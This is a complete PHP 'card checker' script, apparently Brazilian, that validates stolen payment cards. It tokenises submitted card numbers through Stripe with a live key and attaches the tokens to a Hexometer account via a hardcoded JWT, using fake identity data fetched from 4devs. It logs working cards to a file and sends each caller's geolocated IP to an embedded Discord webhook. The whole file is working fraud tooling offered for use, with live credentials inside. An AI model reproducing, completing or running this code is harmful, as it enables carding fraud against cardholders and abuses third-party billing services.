<?php
date_default_timezone_set('America/Sao_Paulo');  
$tempo_real = date('d/m/Y h:i:s a', time()); 



// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================


$time = time();


    error_reporting(0);

    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }

    function ln($size){
    $str = '';
    $numbes = '0123456789abcdef';
    for ($i=0; $i < $size; $i++) { 
   $str.= $numbes[rand(0, strlen($numbes) - 1)];
    }
    return $str;
    }

    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }


$ip = $_SERVER['REMOTE_ADDR'];


/// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============


$metralhalindo = strlen($lista);

if (($metralhalindo < 7 ) or ($metralhalindo > 30 )) {

    die("#Error => Vai se foder randola kkkk...!");

}


$bloqueador_bin = substr($lista, 0, 4);


if (($bloqueador_bin == 6504 ) or ($bloqueador_bin == 6505 ) or ($bloqueador_bin == 6506 ) or ($bloqueador_bin == 6516 ) or ($bloqueador_bin ==  6011 ) or ($bloqueador_bin == 3747 ) or ($bloqueador_bin == 4960 ) or ($bloqueador_bin == 6509 )) {

die("#Error => Vai tacar gerada no cu da sua mae ....! ");


}

$bins_6dig = substr($lista, 0, 6);

if (($bins_6dig == 462239 ) or ($bins_6dig == 462239 ) or ($bins_6dig == 400022 ) or ($bins_6dig == 548723 )!== false ) {


    die("#Error => Vai tacar gerada no cu da sua mae ....!");


}


$ant_noia = substr($lista, 0, 8);
$ant_drogados = substr($lista, 0, 4);


if (($ant_drogados == 'Live')!== false ) {

    die("#Error => Vai se foder randola.....!");

}


if (($ant_noia == 'Aprovada') or ($ant_noia == 'Aprovado')!== false) {

die(json_encode(array("Error" => "Aqui nao noiado do carai...!")));


}


$verificar_ano = strlen($ano);


if (($verificar_ano < 4 ) or ($verificar_ano > 4 )){

    die("Ano de validade, invalida..! O correto é 4 números");

}


$verificar_mes = strlen($mes);


if (($verificar_mes > 2 ) or ($verificar_mes < 2 )) {

    die("Informacoes invalidas, inseridas no mês do cartao de crédito a ser verificado..!");


}


$verificar_cvv = strlen($cvv);


if (($verificar_cvv > 4 ) or ($verificar_cvv < 2 )) {

    die("Informacoes invalidas, inseridas no campo do CVV do cartao de crédito..!");


}

 $anti_reteste_dies = file_get_contents("./ant-reteste-dies.txt", "r");
 $anti_reteste_lives = file_get_contents("./ant-reteste-lives.txt", "r");


if (strpos($anti_reteste_dies, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

if (strpos($anti_reteste_lives, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

$falha_minusculas = substr($lista, 0, 1);

if (($falha_minusculas == 'a') or ($falha_minusculas == 'b') or ($falha_minusculas == 'c') or ($falha_minusculas == 'd') or ($falha_minusculas == 'e') or ($falha_minusculas == 'f') or ($falha_minusculas == 'g') or ($falha_minusculas == 'h') or ($falha_minusculas == 'i') or ($falha_minusculas == 'j') or ($falha_minusculas == 'k') or ($falha_minusculas == 'l') or ($falha_minusculas == 'm') or ($falha_minusculas == 'n') or ($falha_minusculas == 'o') or ($falha_minusculas == 'p') or ($falha_minusculas == 'q') or ($falha_minusculas == 'r') or ($falha_minusculas == 's') or ($falha_minusculas == 't') or ($falha_minusculas == 'u') or ($falha_minusculas == 'v') or ($falha_minusculas == 'w') or ($falha_minusculas == 'x') or ($falha_minusculas == 'y') or ($falha_minusculas == 'z')!== false ) {


    die (json_encode(array(

    "Error" => "Vai zoar o caraio randola"

    )));
}


$falha_maiusculas = substr($lista, 0, 1);

if (($falha_maiusculas == 'A') or ($falha_maiusculas == 'B') or ($falha_maiusculas == 'C') or ($falha_maiusculas == 'D') or ($falha_maiusculas == 'E') or ($falha_maiusculas == 'F') or ($falha_maiusculas == 'G') or ($falha_maiusculas == 'H') or ($falha_maiusculas == 'I') or ($falha_maiusculas == 'J') or ($falha_maiusculas == 'K') or ($falha_maiusculas == 'L') or ($falha_maiusculas == 'M') or ($falha_maiusculas == 'N') or ($falha_maiusculas == 'O') or ($falha_maiusculas == 'P') or ($falha_maiusculas == 'Q') or ($falha_maiusculas == 'R') or ($falha_maiusculas == 'S') or ($falha_maiusculas == 'T') or ($falha_maiusculas == 'U') or ($falha_maiusculas == 'V') or ($falha_maiusculas == 'W') or ($falha_maiusculas == 'X') or ($falha_maiusculas == 'T') or ($falha_maiusculas == 'Z')!== false ) {


    die (json_encode(array(

    "Error" => "Vai zoar o caraio randola"

    )));
}
 

$vencimento_ano = substr($ano, 0, 4);


if (($vencimento_ano == '2021') or ($vencimento_ano == '2020') or ($vencimento_ano == '2019') or ($vencimento_ano == '2018') or ($vencimento_ano == '2017') or ($vencimento_ano == '2016') or ($vencimento_ano == '2015') or ($vencimento_ano == '2014') or ($vencimento_ano == '2013') or ($vencimento_ano == '2012') or ($vencimento_ano == '2011') or ($vencimento_ano == '2010') or ($vencimento_ano == '2009')!== false) {


    die("#Error => CC da época das caverna meu irmão kkkkk...!");


}


$bloquear_ip = substr($cvv, 0, 3);


if (($bloquear_ip == '000' )!== false) {

      $file2 = fopen("IPS.txt", "a");
      fwrite($file2, "$ip\n");

      die("#Error => Tacou 000 né? Seu ip foi bloqueado ...!");
          
}


$ler_ips = file_get_contents("./IPS.txt", "r");

if (strpos($ler_ips, $ip)!== false) {

    die("Seu ip foi bloqueado por testar gerada.! Peça o desbloqueio para o desenvolvedor Metralha#5512");


}

 /// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============




// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//

$verificar_bin = substr($lista, 0, 6);


$link = 'https://lookup.binlist.net/'.$verificar_bin.'';

$headers = array (

'accept: */*',
'origin: https://binlist.net',
'referer: https://binlist.net/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'


);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers);
$automatizacao_binssearch = curl_exec($ini);



$scheme = strtoupper(json_decode($automatizacao_binssearch, true)['scheme']);
$band = strtoupper(json_decode($automatizacao_binssearch, true)['brand']);
$bank = strtoupper(json_decode($automatizacao_binssearch, true)['bank']['name']);
$type = strtoupper(json_decode($automatizacao_binssearch, true)['type']);
$states = strtoupper(json_decode($automatizacao_binssearch, true)['country']['name']);

$prepaid = metraiapuxar($automatizacao_binssearch, '"prepaid":',',', 1);


if (empty($scheme)!== false) {

    $retorno_scheme = "NÃO ENCONTRADO";

} else {

    $retorno_scheme = ''.$scheme.'';

}

if (empty($band)!== false) {

    $retorno_band = "NÃO ENCONTRADO";

} else {

    $retorno_band = ''.$band.'';
    
}


if (empty($bank)!== false) {

    $retorno_bank = "NÃO ENCONTRADO";

} else {

    $retorno_bank = ''.$bank.'';
    
}


if (empty($type)!== false) {

    $retorno_type = "NÃO ENCONTRADO";

} else {

    $retorno_type = ''.$type.'';
    
}


if (empty($states)!== false) {

    $retorno_states = "NÃO ENCONTRADO";

} else {

    $retorno_states = ''.$states.'';
    
}


if ($prepaid == 'false'){

    $Verificar_prepaid = "NÃO";

} else if ($prepaid == null) {

    $Verificar_prepaid = "N/A";

} else if ($prepaid == 'null'){

    $Verificar_prepaid = "N/A";

} else {

    $Verificar_prepaid = "SIM";

}


// RETORNOS DOS RESULTADOS DA BIN:  $retorno_band $retorno_scheme  $retorno_states $retorno_bank $retorno_type 


// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//



// ================ // ====================//==========================//============================= // ================================//=================//

## DADOS INFO - 4DEVS (API DADOS CHK)

$linkurl_dados = "https://www.4devs.com.br/ferramentas_online.php";
$post_dados = 'acao=gerar_pessoa&sexo=I&pontuacao=N&idade=0&cep_estado=&txt_qtde=1&cep_cidade=';
$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.54";


$header_4devs = array (

'content-type: application/x-www-form-urlencoded',
'origin: https://www.4devs.com.br',
'referer: https://www.4devs.com.br/gerador_de_pessoas',
'user-agent: '.$agent.''

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $linkurl_dados);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_4devs);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_dados);
$dados = curl_exec($ini);


$nome = metraiapuxar($dados, '"nome":"','"');
$cpf = metraiapuxar($dados, '"cpf":"','"');
$rg = metraiapuxar($dados, '"rg":"','"');
$data_nasc = metraiapuxar($dados, '"data_nasc":"','"');
$sexo = metraiapuxar($dados, '"sexo":"','"');
$mae = metraiapuxar($dados, '"mae":"','"');
$pai = metraiapuxar($dados, '"pai":"','"');
$cep = metraiapuxar($dados, '"cep":"','"');
$email = metraiapuxar($dados, '"email": "','"', 1);
$numero = metraiapuxar($dados, '"numero":',',', 1);
$endereco = metraiapuxar($dados, '"endereco":"','"');
$bairro = metraiapuxar($dados, '"bairro":"','"');
$celular = metraiapuxar($dados, '"celular":"','"');
$cidade = metraiapuxar($dados, '"cidade":"','"');
$telefone_fixo = metraiapuxar($dados, '"telefone_fixo":"','"');


## DADOS INFO - 4DEVS (API DADOS CHK)

// ================ // ====================//==========================//============================= // ================================//=================//


$header_stripesrc = array (

'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77'

);


$link_stripesrc = "https://api.stripe.com/v1/tokens";


$postfields_stripesrc = 'time_on_page=289270&pasted_fields=number&guid=NA&muid=31451609-7842-4a7e-8d65-a8238a82adbff2b0f6&sid=29b8a38b-ef56-46a4-bf40-33b558f36c5b3f97ea&key=pk_live_8KwSrH69LnrJea7rrCH7Phn1&payment_user_agent=stripe.js%2F78ef418&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'';



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_stripesrc);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_stripesrc);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_stripesrc);
$stripe = curl_exec($ini);
$id_do_carai = metraiapuxar($stripe, 'id": "', '"', 1);



$header_pagar = array (

'accept: */*',
'authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjkwMDY3IiwidmVyc2lvbiI6MiwidXNlclR5cGUiOiJ1c2VyIiwiaWF0IjoxNjY2NTA1MTI5LCJleHAiOjE2NjY1MDg3Mjl9.BtUCFI_oGsTVptqCesjFz1OEXokpP0RpYlAZX6ZCARw', // TROQUE CONFORME NOVA CONTA É LÓGICO QUE IRA USAR NOVA CONTA ENTAO TROCA PORRA.
'content-type: application/json',
'origin: https://dash.hexometer.com',
'referer: https://dash.hexometer.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77'


);

$link_pagar = "https://api.hexometer.com/v2/ql";

$postfields_pagar = '{"operationName":"addCard","variables":{"settings":{"email":TROQUE-O-EMAIL-PARA-O-EMAIL-DA-CONTA-EM-QUE-USARÁ","name":"'.$nome.'","source":"'.$id_do_carai.'"}},"query":"mutation addCard($settings: AddCardInput) {\n  BillingOps {\n    addCard(settings: $settings) {\n      error_code\n      cardId\n    }\n  }\n}\n"}';




$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_pagar);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_pagar);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_pagar);
 $pagar = curl_exec($ini);


$link_carteiracard = "https://api.hexometer.com/v2/ql";

$post_carteira = '{"operationName":null,"variables":{"settings":{"limit":100}},"query":"query ($settings: ListCustomerCardsInput) {\n  Billing {\n    listCustomerCards(settings: $settings) {\n      cards {\n        id\n        createdAt\n        updatedAt\n        customerId\n        brand\n        lastDigits\n        isDefault\n      }\n      error_code\n    }\n  }\n}\n"}';

$header_carteira = array (

'accept: */*',
'authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjkwMDY3IiwidmVyc2lvbiI6MiwidXNlclR5cGUiOiJ1c2VyIiwiaWF0IjoxNjY2NTA1MTI5LCJleHAiOjE2NjY1MDg3Mjl9.BtUCFI_oGsTVptqCesjFz1OEXokpP0RpYlAZX6ZCARw',
'content-type: application/json',
'origin: https://dash.hexometer.com',
'referer: https://dash.hexometer.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77'

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_carteiracard);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_POST, "POST");
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_carteira);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_carteira);
$carteira = curl_exec($ini);


$header_localizarip = array (

'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://localizeip.com.br',
'referer: https://localizeip.com.br/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'upgrade-insecure-requests: 1',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.65'

);

$link_localizarip = "https://localizeip.com.br/";

$postfields_localizarip = 'valor='.$ip.'';


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_localizarip);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_localizarip);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_localizarip);
$localizar_ip = curl_exec($ini);


$ip_pais = metraiapuxar($localizar_ip, '<div class="item_baixo_mapa"><b>País:</b>','</div>', 1);
$estado_ip = metraiapuxar($localizar_ip, '<div class="item_baixo_mapa"><b>Estado:</b>','</div>', 1);
$cidade_ip = metraiapuxar($localizar_ip, '<div class="item_baixo_mapa"><b>Cidade:</b>','</div>', 1);
$provedor_ip = metraiapuxar($localizar_ip, '<div class="item_baixo_mapa"><b>Provedor:</b>','</div>', 1);





$cartoes = metraiapuxar($carteira, '"cards":[{','}],', 1);

$contar_cartoes = substr_count($cartoes, 'id');


$result = metraiapuxar($pagar, '"error_code":"','"', 1);


if (empty($cartoes)!== false) {


    $vinculados = "Falha (N/A)";

} else {


    $vinculados = ''.$contar_cartoes.'';

}


if (empty($result)!== false) {


    $retorno = "Falha (N/A)";


} else {


    $retorno = ''.$result.'';

}


$card_id = metraiapuxar($pagar, '"cardId":"','"', 1);


if (empty($card_id)!== false) {

    $id_cart = "Falha (N/A)";


} else {

    $id_cart = ''.$card_id.'';


}




if (empty($pagar)!== false) {


    $Verificacao_live = "Falha (N/A)";


} else {


    $Verificacao_live = 'Cartao verificado, e incluido na carteira de pagamentos. (Auth-Card) / CARTOES VINCULADOS: '.$vinculados.'';


}


if (empty($ip)!== false) {

    $webhook_ip = "Não foi encontrado nenhum IP.";

} else {

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://discord.com/api/webhooks/1031070546328289351/uiBb3CxmwBluxtFNV1bAzR_QyIoztzpk2YdEJKVyBu4cHTnFjioqI3TCTcpl5wbBSrg6');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: en',
'content-type: application/json',
'origin: https://discohook.org',
'referer: https://discohook.org/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"username":"STATUS","avatar_url":"https://cdn.discordapp.com/attachments/1000611490568609883/1023802237463576606/pepefrg-8.gif","content":"","embeds":[{"color":3447003,"description":"**REQUESTS:**\n\n```A máquina de IP: '.$ip.'\n\nEsta fazendo requisicões na API [ STRIPE AUTH]..\n\nINFORMACOES:\n\nPaís: '.$ip_pais.'\nEstado: '.$estado_ip.'\nCidade: '.$cidade_ip.'\nProvedor: '.$provedor_ip.'\n\nData: '.$tempo_real.'\n\n```","timestamp":"","author":{"name":"STATUS CHECKERS"},"image":{},"thumbnail":{},"footer":{"text":"Dev: Metralha"},"fields":[]}],"components":[]}');
$infos = curl_exec($ch);

}



if(strpos($pagar, '"error_code":null')!== false){

    echo "<span class='badge badge-success'>#Aprovada</span> ✔ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-warning'>RETORNO</span> $Verificacao_live <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)."s <span class='badge badge-warning'>ID</span> $id_cart <br>";

      $file = fopen("ant-reteste-lives.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");

      $retornogate = fopen("retornogate.txt", "a");
      fwrite($retornogate, "$pagar \n\n\n");


}  else if (empty($pagar)!== false ) {

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-'>Retorno:</span> N/A (NÃO IDENTIFICADO)  » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <span class='badge badge-warning'>Result Gateway</span> Error de Proxy..! <br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");

}

else {


        echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $retorno_band - $retorno_scheme <span class='badge badge-primary'>BANCO</span> $retorno_bank <span class='badge badge-primary'>PAIS</span> $retorno_states <span class='badge badge-primary'>TIPO</span> $retorno_type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-'>Retorno:</span> $retorno  » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");


}

?>